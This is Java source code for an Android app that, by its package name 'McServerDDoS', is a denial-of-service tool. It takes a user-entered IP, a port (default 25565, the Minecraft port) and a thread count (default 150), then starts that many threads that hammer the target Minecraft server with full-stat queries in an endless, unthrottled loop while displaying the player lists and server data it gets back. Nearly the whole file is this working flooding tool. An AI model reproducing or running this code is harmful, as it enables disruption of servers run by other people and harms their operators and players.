package com.nao20010128nao.McServerDDoS;

import android.app.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.preference.*;
import android.content.*;
import query.*;
import java.util.*;
import android.util.*;
import java.io.*;
import java.security.*;
import java.net.*;
import android.support.v4.app.*;
import java.lang.ref.*;

public class MainActivity extends Activity
{
	SharedPreferences pref;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		pref=PreferenceManager.getDefaultSharedPreferences(MainActivity.this);
		((EditText)findViewById(R.id.ip)).setText(pref.getString("ip",""));
		((EditText)findViewById(R.id.port)).setText(""+pref.getInt("port",25565));
		((EditText)findViewById(R.id.threads)).setText(""+pref.getInt("threads",150));
		findViewById(R.id.start).setOnClickListener(new View.OnClickListener(){
			public void onClick(View v){
				String ip=((EditText)findViewById(R.id.ip)).getText().toString();
				int port=Integer.parseInt(((EditText)findViewById(R.id.port)).getText().toString());
				int threads=Integer.parseInt(((EditText)findViewById(R.id.threads)).getText().toString());
				pref
					.edit()
					.putString("ip",ip)
					.putInt("port",port)
					.putInt("threads",threads)
					.commit();
				startActivity(new Intent(MainActivity.this,TabsDDoS.class).putExtra("ip",ip).putExtra("threads",threads).putExtra("port",port));
			}
		});
    }
	public static class TabsDDoS extends FragmentActivity {
		static WeakReference<TabsDDoS> instance=new WeakReference(null);
		
		List<Thread> t=new ArrayList<>();
		ListView players,sortedPlayers,data;
		FragmentTabHost fth;
		TabHost.TabSpec playersF,dataF,sortedPlayersF;
		
		ArrayAdapter<String> adap,adap3;
		ArrayAdapter<Map.Entry<String,String>> adap2;
		@Override
		protected void onCreate(Bundle savedInstanceState) {
			// TODO: Implement this method
			super.onCreate(savedInstanceState);
			instance=new WeakReference(this);
			
			setContentView(R.layout.tabs);
			fth=(FragmentTabHost)findViewById(android.R.id.tabhost);
			fth.setup(this,getSupportFragmentManager(),R.id.container);
			
			playersF=fth.newTabSpec("playersList");
			playersF.setIndicator(getResources().getString(R.string.players));
			fth.addTab(playersF,PlayersFragment.class,null);
			
			sortedPlayersF=fth.newTabSpec("sortedPlayersList");
			sortedPlayersF.setIndicator(getResources().getString(R.string.sortedPlayers));
			fth.addTab(sortedPlayersF,SortedPlayersFragment.class,null);

			dataF=fth.newTabSpec("dataList");
			dataF.setIndicator(getResources().getString(R.string.data));
			fth.addTab(dataF,DataFragment.class,null);
			
			adap=new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,new ArrayList<String>());
			adap2=new ArrayAdapter<Map.Entry<String,String>>(this,0,new ArrayList<Map.Entry<String,String>>()){
								public View getView(int pos,View v,ViewGroup ignore){
									if(v==null)
										v=getLayoutInflater().inflate(R.layout.data,null);
									((TextView)v.findViewById(R.id.k)).setText(getItem(pos).getKey());
									((TextView)v.findViewById(R.id.v)).setText(getItem(pos).getValue());
									return v;
								}
							};
			adap3=new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,new ArrayList<String>());
			/*findViewById(R.id.stop).setOnClickListener(new View.OnClickListener(){
					public void onClick(View w){
						finish();
					}
				});*/
			for (int i=0;i < getIntent().getIntExtra("threads",150);i++){
				t.add(new Thread(){
						public void run() {
							String ip=getIntent().getStringExtra("ip");
							int port=getIntent().getIntExtra("port", 25565);
							Log.d("data", ip + ":" + port);
							MCQuery q=new MCQuery(ip, port);
							while (!Thread.interrupted()) {
								try {
									QueryResponseUniverse resp=q.fullStatUni();
									update(resp);
								} catch (Throwable e) {
									e.printStackTrace();
								}
							}
							q.finalize();
						}
					});
				t.get(t.size()-1).start();
			}
		}
		public synchronized void update(final QueryResponseUniverse resp){
			runOnUiThread(new Runnable(){
					public void run(){
						Log.d("data","updating..");
						adap.clear();
						adap.addAll(resp.getPlayerList());
						adap2.clear();
						adap2.addAll(resp.getData().entrySet());
						adap3.clear();
						ArrayList<String> sort=new ArrayList<>(resp.getPlayerList());
						Collections.sort(sort);
						adap3.addAll(sort);
					}
				});
		}
		static void setPlayersView(ListView lv){
			instance.get().setPlayersView_(lv);
		}
		static void setDataView(ListView lv){
			instance.get().setDataView_(lv);
		}
		static void setSortedPlayersView(ListView lv){
			instance.get().setSortedPlayersView_(lv);
		}
		
		void setPlayersView_(ListView lv){
			players=lv;
			lv.setAdapter(adap);
		}
		void setDataView_(ListView lv){
			data=lv;
			lv.setAdapter(adap2);
		}
		void setSortedPlayersView_(ListView lv){
			sortedPlayers=lv;
			lv.setAdapter(adap3);
		}
		
		@Override
		protected void onDestroy() {
			// TODO: Implement this method
			super.onDestroy();
			for(Thread th:t)
				th.interrupt();
		}
		public static class PlayersFragment extends android.support.v4.app.Fragment {
			@Override
			public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
				// TODO: Implement this method
				ListView lv=(ListView) inflater.inflate(R.layout.ddos_players_tab,null,false);
				setPlayersView(lv);
				return lv;
			}
		}
		public static class SortedPlayersFragment extends android.support.v4.app.Fragment {
			@Override
			public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
				// TODO: Implement this method
				ListView lv=(ListView) inflater.inflate(R.layout.ddos_players_tab,null,false);
				setSortedPlayersView(lv);
				return lv;
			}
		}
		public static class DataFragment extends android.support.v4.app.Fragment {
			@Override
			public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
				// TODO: Implement this method
				ListView lv=(ListView) inflater.inflate(R.layout.ddos_data_tab,null,false);
				setDataView(lv);
				return lv;
			}
		}
	}
}
